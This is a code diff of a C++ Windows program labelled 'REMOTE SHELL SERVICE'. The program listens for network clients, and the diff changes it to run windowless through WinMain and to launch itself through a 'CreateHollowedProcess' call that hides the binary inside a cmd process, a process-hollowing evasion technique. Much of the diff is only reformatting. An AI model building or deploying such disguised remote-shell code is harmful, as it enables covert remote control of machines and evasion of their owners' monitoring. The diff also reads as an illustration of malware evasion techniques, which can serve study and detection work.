@@ -13,19 +13,21 @@
 #include "log.h"
 #include "cmdline.h"
 #include "netclient.h"
+#include "windows-api-ex.h"
 
+void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile);
 
 using namespace std;
 
 SOCKET client_socket[10];
 int max_clients = 10;
-void (* _EventNotifierFunction)(WORD EventCode);
-SERVICE_STATUS ServiceStatus; 
-SERVICE_STATUS_HANDLE hStatus; 
+void (*_EventNotifierFunction)(WORD EventCode);
+SERVICE_STATUS ServiceStatus;
+SERVICE_STATUS_HANDLE hStatus;
 
 BOOL  ConsoleCtrlHandler(DWORD CtrlCode);
-void  ServiceMain(int argc, char** argv); 
-void  ControlHandler(DWORD request); 
+void  ServiceMain(int argc, char** argv);
+void  ControlHandler(DWORD request);
 int   InitService();
 void  ServiceReportEvent(WORD  LogType, const TCHAR* ProcessName, TCHAR* Message);
 int   _MainFunction(int argc, char* argv[]);
@@ -38,10 +40,10 @@ void StartInBackground()
 {
     LOG_INFO("SvcMain::StartInBackground", "StartInBackground");
 
-    SERVICE_TABLE_ENTRY ServiceTable[2];  
+    SERVICE_TABLE_ENTRY ServiceTable[2];
     ServiceTable[0].lpServiceName = SVC_NAME;
     ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
- 
+
     ServiceTable[1].lpServiceName = NULL;
     ServiceTable[1].lpServiceProc = NULL;
     // Start the control dispatcher thread for our service
@@ -49,31 +51,18 @@ void StartInBackground()
     if (!StartServiceCtrlDispatcher(ServiceTable)) {
         LOG_ERROR("SvcMain::StartInBackground", "StartServiceCtrlDispatcher failed %ls (%d)", SVC_NAME, GetLastError());
         ServiceReportEvent(0, SVC_NAME, TEXT("StartServiceCtrlDispatcher failed"));
-        ErrorMessage("StartServiceCtrlDispatcher");
+        //ErrorMessage("StartServiceCtrlDispatcher");
         return;
     }
     return;
 
 }
 
-long StartInForeground(int argc, char* argv[])
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    long RetVal = -1;
 
-    if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
-        return RetVal;
-    }
-
-    RetVal = _MainFunction(argc, argv);
-
-    return RetVal;
-}
-
- 
-int main(int argc, char* argv[])
-{ 
     int RetVal = -1;
-    CmdLineUtil::getInstance()->initializeCmdlineParser(argc, argv);
+    CmdLineUtil::getInstance()->initializeCmdlineParser(__argc, __argv);
     CmdlineParser* inputParser = CmdLineUtil::getInstance()->getInputParser();
     CmdlineOption cmdlineOptionHelp({ "-h", "--help" }, "display this help");
     CmdlineOption cmdlineOptionDebug({ "-d", "--debug" }, "debug");
@@ -96,118 +85,160 @@ int main(int argc, char* argv[])
     COUTY("REMOTE SHELL SERVICE");
     COUTR("================================================");
 
-
-    if(optDebug){
+    if (optDebug) {
         COUTY("START IN TEST MODE: FOREGROUND");
-        
-        if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
+
+        //LPWSTR lpExePath = C::Path::GetExecutablePath();
+        //char* seExe = C::Convert::StringToString(lpExePath);
+  
+        char* pPath = new char[MAX_PATH];
+        GetModuleFileNameA(0, pPath, MAX_PATH);
+        pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
+        strcat(pPath, "shellsvc.exe");
+        COUTY("Starting Service %s", pPath);
+        LOG_TRACE("SvcMain", "Starting Service %s", pPath);
+
+        CreateHollowedProcess
+        (
+            "cmd",
+            pPath
+        );
+
+
+        /*if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
             return RetVal;
         }
 
         RetVal = _MainFunction(argc, argv);
+        */
+        
+        return RetVal;
 
-        return RetVal;        
-
-    }else if(optIntall){
+    }
+    else if (optIntall) {
         COUTY("INSTALL SERVICE");
         return RET_SUCCESS;
     }
-    else if(optUninstall){
+    else if (optUninstall) {
         COUTY("UNINSTALL SERVICE");
         return RET_SUCCESS;
     }
     StartInBackground();
+   
     return RET_SUCCESS;
 }
 
 
 
-void ServiceMain(int argc, char** argv) 
-{ 
-    int error; 
-    WriteToLog("ServiceMain");
-  LOG_TRACE("ServiceMain", "ServiceMain");
-    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
-    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
-    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-    ServiceStatus.dwWin32ExitCode      = 0; 
-    ServiceStatus.dwServiceSpecificExitCode = 0; 
-    ServiceStatus.dwCheckPoint         = 0; 
-    ServiceStatus.dwWaitHint           = 0; 
+void ServiceMain(int argc, char** argv)
+{
 
-    hStatus = RegisterServiceCtrlHandler(SVC_NAME,(LPHANDLER_FUNCTION)ControlHandler); 
+    // ensure only one running instance
+    HANDLE hMutexHandle = CreateMutex(NULL, TRUE, "my.mutex.name");
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    {
 
-    if (hStatus == (SERVICE_STATUS_HANDLE)0) 
-    { 
-        // Registering Control Handler failed
-        return; 
-    }  
-    // Initialize Service 
-    error = InitService(); 
-    if (error) 
-    {
-        // Initialization failed
-        ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
-        ServiceStatus.dwWin32ExitCode      = -1; 
-        SetServiceStatus(hStatus, &ServiceStatus); 
-        return; 
-    } 
-    // We report the running status to SCM. 
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
-    SetServiceStatus (hStatus, &ServiceStatus);
-    
-    // The worker loop of a service
-    if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
-    {
-        LOG_TRACE("ServiceMain", "SERVICE_RUNNING");
-        Sleep(500);
-        _MainFunction(argc, argv);
+        int error;
+        WriteToLog("ServiceMain");
+        LOG_TRACE("ServiceMain", "ServiceMain");
+        ServiceStatus.dwServiceType = SERVICE_WIN32;
+        ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
+        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+        ServiceStatus.dwWin32ExitCode = 0;
+        ServiceStatus.dwServiceSpecificExitCode = 0;
+        ServiceStatus.dwCheckPoint = 0;
+        ServiceStatus.dwWaitHint = 0;
+
+        hStatus = RegisterServiceCtrlHandler(SVC_NAME, (LPHANDLER_FUNCTION)ControlHandler);
+
+        if (hStatus == (SERVICE_STATUS_HANDLE)0)
+        {
+            // Registering Control Handler failed
+            return;
+        }
+        // Initialize Service 
+        error = InitService();
+        if (error)
+        {
+            // Initialization failed
+            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+            ServiceStatus.dwWin32ExitCode = -1;
+            SetServiceStatus(hStatus, &ServiceStatus);
+            return;
+        }
+        // We report the running status to SCM. 
+        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+        SetServiceStatus(hStatus, &ServiceStatus);
+
+        // The worker loop of a service
+        if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+        {
+            LOG_TRACE("ServiceMain", "SERVICE_RUNNING");
+            Sleep(500);
+            _MainFunction(argc, argv);
+        }
+        // The worker loop of a service
+
+     
+        return;
     }
-    // The worker loop of a service
-    
-    return; 
+
+    char* pPath = new char[MAX_PATH];
+    GetModuleFileNameA(0, pPath, MAX_PATH);
+    pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
+    strcat(pPath, "shellsvc.exe");
+    COUTY("Starting Service %s", pPath);
+    LOG_TRACE("SvcMain", "Starting Service %s", pPath);
+
+    CreateHollowedProcess
+    (
+        "cmd",
+        pPath
+    );
+
+    Sleep(2000);
 }
-  
+
 // Service initialization
-int InitService() 
-{ 
+int InitService()
+{
     int result;
     result = WriteToLog("Monitoring started.");
-    return(result); 
-} 
- 
- 
+    return(result);
+}
+
+
 // Control handler function
-void ControlHandler(DWORD request) 
-{ 
-  WriteToLog("ControlHandler");
-    switch(request) 
-    { 
-        case SERVICE_CONTROL_STOP: 
-             WriteToLog("Monitoring stopped.");
- 
-            ServiceStatus.dwWin32ExitCode = 0; 
-            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
-            SetServiceStatus (hStatus, &ServiceStatus);
-            return; 
-  
-        case SERVICE_CONTROL_SHUTDOWN: 
-            WriteToLog("Monitoring stopped.");
- 
-            ServiceStatus.dwWin32ExitCode = 0; 
-            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
-            SetServiceStatus (hStatus, &ServiceStatus);
-            return; 
-         
-        default:
-            break;
-    }  
-     
+void ControlHandler(DWORD request)
+{
+    WriteToLog("ControlHandler");
+    switch (request)
+    {
+    case SERVICE_CONTROL_STOP:
+        WriteToLog("Monitoring stopped.");
+
+        ServiceStatus.dwWin32ExitCode = 0;
+        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+        SetServiceStatus(hStatus, &ServiceStatus);
+        return;
+
+    case SERVICE_CONTROL_SHUTDOWN:
+        WriteToLog("Monitoring stopped.");
+
+        ServiceStatus.dwWin32ExitCode = 0;
+        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+        SetServiceStatus(hStatus, &ServiceStatus);
+        return;
+
+    default:
+        break;
+    }
+
     // Report current status
-    SetServiceStatus (hStatus,  &ServiceStatus);
-  
-    return; 
-}   
+    SetServiceStatus(hStatus, &ServiceStatus);
+
+    return;
+}
 
 #if defined(_WIN32)
 #define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
@@ -222,7 +253,7 @@ int _MainFunction(int argc, char** argv)
 #else
     std::string strError = "";
 #endif
-    
+
     LOG_TRACE("ServiceMain", "4");
     WSADATA wsa;
     SOCKET master, new_socket, client_socket[30], s;
@@ -271,7 +302,7 @@ int _MainFunction(int argc, char** argv)
     //Bind
     _NETPRINTF("Binding on port %d", port);
     DWORD bidRes = bind(master, (struct sockaddr*)&server, sizeof(server));
-    while(bidRes == SOCKET_ERROR)
+    while (bidRes == SOCKET_ERROR)
     {
         _NETPRINTF("Binding on port %d FAILURE", port);
         DWORD netLastErrror = WSAGetLastError();
@@ -299,16 +330,17 @@ int _MainFunction(int argc, char** argv)
     addrlen = sizeof(struct sockaddr_in);
 
     while (TRUE)
-    {     
+    {
         for (i = 0; i < max_clients; i++)
         {
             s = client_socket[i];
-            int nSendBytes = send(s, "", 0, 0);
-             if (nSendBytes == SOCKET_ERROR)
-             {
-                 client_socket[i] = 0;
-                 ErrorMessage("Disconnected");
-             }
+            if (ISVALIDSOCKET(s)) {
+                if (SOCKET_ERROR == send(s, "", 0, 0)) {
+                    client_socket[i] = 0;
+                    _NETPRINTF("Disconnected Socket %d (0x%08lx)", (unsigned int)s, (unsigned int)s);
+                }
+            }
+
         }
         //clear the socket fd set
         FD_ZERO(&readfds);
@@ -320,7 +352,7 @@ int _MainFunction(int argc, char** argv)
         for (i = 0; i < max_clients; i++)
         {
             s = client_socket[i];
-            if(s > 0)
+            if (s > 0)
             {
                 FD_SET(s, &readfds);
             }
@@ -349,7 +381,7 @@ int _MainFunction(int argc, char** argv)
             //inform user of socket number - used in send and receive commands
             _NETPRINTF("New connection , socket fd is  0x%08lx , ip is : %s , port : %d \n", (unsigned int)new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));
 
-     
+
             //add new socket to array of sockets
             for (i = 0; i < max_clients; i++)
             {
@@ -378,14 +410,14 @@ void ServiceReportEvent(WORD EventLogType, const TCHAR* ProcessName, TCHAR* Mess
 
     if (NULL != hEventSource) {
 
-  
+
         LOG_TRACE("MultiPurposeService", "ServiceReportEvent %ls", Message);
 
         lpszStrings[0] = ProcessName;
         lpszStrings[1] = Buffer;
 
-        
-  
+
+
         ReportEvent(hEventSource,        // event log handle
             EventLogType,        // event type
             0,                   // event category
